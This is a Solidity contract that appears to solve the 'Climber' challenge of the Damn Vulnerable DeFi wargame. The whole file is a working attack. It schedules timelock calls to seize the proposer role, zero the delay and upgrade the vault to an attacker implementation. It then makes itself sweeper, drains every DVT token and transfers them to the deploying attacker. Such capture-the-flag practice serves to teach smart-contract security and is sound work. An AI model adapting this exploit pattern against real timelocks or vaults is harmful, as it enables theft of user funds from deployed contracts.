// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./AttackVault.sol";
import "../DamnValuableToken.sol";

contract AttackTimelock {
    address payable public immutable attacker;
    DamnValuableToken public immutable dvt;
    ClimberTimelock public immutable timelock;
    AttackVault public immutable vault;
    address[] to;
    bytes[] scheduleData;

    constructor(
        DamnValuableToken _dvt,
        ClimberTimelock _timelock,
        AttackVault _vault
    ) payable {
        attacker = payable(msg.sender);
        dvt = _dvt;
        timelock = _timelock;
        vault = _vault;
    }

    function setScheduleData(
        address[] memory _to,
        bytes[] memory data
    ) external {
        // Will set the scheduled data in contract to be accessible.
        to = _to;
        scheduleData = data;
    }

    function attack() external {
        // Attack will schedule our calls inside timelock contract.
        // 1. Se this contract as proposer
        // 2. Update delay to 0.
        // 3. Upgrade Vault with AttackVault
        uint256[] memory emptyData = new uint256[](to.length);
        timelock.schedule(to, emptyData, scheduleData, 0);

        // Now we set the sweeper to be this contract and withdraw all funds
        vault.setSweeper(address(this));
        vault.sweepFunds(address(dvt));

        // Send all funds to attacker
        SafeTransferLib.safeTransfer(
            address(dvt),
            attacker,
            dvt.balanceOf(address(this))
        );
    }
}
